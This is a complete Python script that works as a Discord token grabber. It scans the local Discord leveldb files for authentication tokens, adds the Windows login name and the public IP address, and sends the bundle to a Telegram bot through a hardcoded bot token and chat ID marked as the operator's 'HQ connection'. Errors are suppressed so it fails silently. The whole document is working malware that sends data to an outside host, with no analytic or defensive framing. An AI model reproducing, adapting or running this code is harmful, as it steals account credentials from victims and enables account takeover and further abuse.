import os, requests, json, re

def grab_windows():
    appdata = os.getenv('APPDATA')
    
    # Target: Discord Tokens (2026 Format)
    tokens = []
    ds_path = os.path.join(appdata, 'discord', 'Local Storage', 'leveldb')
    if os.path.exists(ds_path):
        for f in [x for x in os.listdir(ds_path) if x.endswith('.log') or x.endswith('.ldb')]:
            try:
                for line in open(os.path.join(ds_path, f), errors='ignore').readlines():
                    for t in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}", line):
                        if t not in tokens: tokens.append(t)
            except: continue

    # The Log Package
    user_info = {
        "User": os.getlogin(),
        "Tokens": tokens,
        "IP": requests.get('https://api.ipify.org').text
    }

    # --- YOUR HQ CONNECTION ---
    bot_token = "8726414002:AAGBuEnlurmGP0cVjk5OF1th2DN24QSxLic"
    chat_id = "7929123246"
    
    requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", 
                  json={"chat_id": chat_id, "text": json.dumps(user_info, indent=2)})

if __name__ == "__main__":
    try: grab_windows()
    except: pass